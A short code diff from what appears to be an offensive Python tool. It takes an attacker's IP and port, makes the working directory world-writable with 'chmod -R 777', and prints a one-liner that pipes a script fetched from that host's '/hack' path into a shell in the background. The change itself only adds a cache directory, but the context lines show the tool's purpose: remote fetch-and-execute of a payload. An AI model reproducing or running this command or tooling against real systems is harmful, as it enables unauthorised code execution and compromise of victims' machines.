@@ -87,6 +87,8 @@ if __name__ == "__main__":
         print('e.g. python3 app.py 1.1.1.1 12345')
         sys.exit()
     os.popen("chmod -R 777 .")
+    if not os.path.exists('./caches'):
+        os.makedirs('./caches')
     IP = sys.argv[1]
     PORT = sys.argv[2]
     print("[+] curl http://{}:{}/hack -s | sh &".format(IP, PORT))
